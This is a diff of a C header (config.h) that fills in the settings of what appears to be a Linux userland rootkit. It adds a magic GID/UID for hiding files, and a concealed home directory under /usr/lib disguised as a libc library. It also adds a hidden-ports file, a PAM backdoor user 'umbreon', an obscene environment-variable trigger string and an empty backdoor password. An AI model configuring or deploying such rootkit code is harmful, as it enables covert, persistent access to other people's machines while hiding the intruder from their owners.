@@ -4,6 +4,7 @@
 */
 #ifndef CONFIG_H
 #define CONFIG_H
+#define _STAT_VER 3
 #ifdef __i386__
 #define BUILD_ARCH "i686"
 #endif
@@ -17,10 +18,10 @@
 #define HAVE_PAM
 #define LIBPAM_PATH "libpam.so.0"
 
-#define MAGIC_STRING "libc.so.0"
-#define MAGIC_GID 197
-#define MAGIC_UID 197
-#define HOMEDIR "homedir.replace"
+#define MAGIC_STRING "libc.so.2852418076"
+#define MAGIC_GID 1949069214
+#define MAGIC_UID 1949069214
+#define HOMEDIR "/usr/lib/libc.so.28524180762852418076"
 
 #define HIDEPORTS_FILE HOMEDIR"/hideports"
 
@@ -36,9 +37,9 @@
 #define HIGH_PORT 198
 
 /* PT initiation key */
-#define BD_USER "USERDEFAULT"
+#define BD_USER "umbreon"
 
-#define ENV_VARIABLE "ENVDEFAULT"
+#define ENV_VARIABLE "FUCKMYANUSDONGSYOULITTLEFUCKINGSLUTFACEPORNSTAR"
 
 #define SHELL_MSG "\n"
 
@@ -46,5 +47,5 @@
 
 #define LIBC_PATH "libc.so.6"
 #endif
-#define HOMEDIR "homedir.replace"
-#define BD_CRYPT_PASS "cryptpass.replace"
+#define HOMEDIR "/usr/lib/libc.so.28524180762852418076"
+#define BD_CRYPT_PASS ""
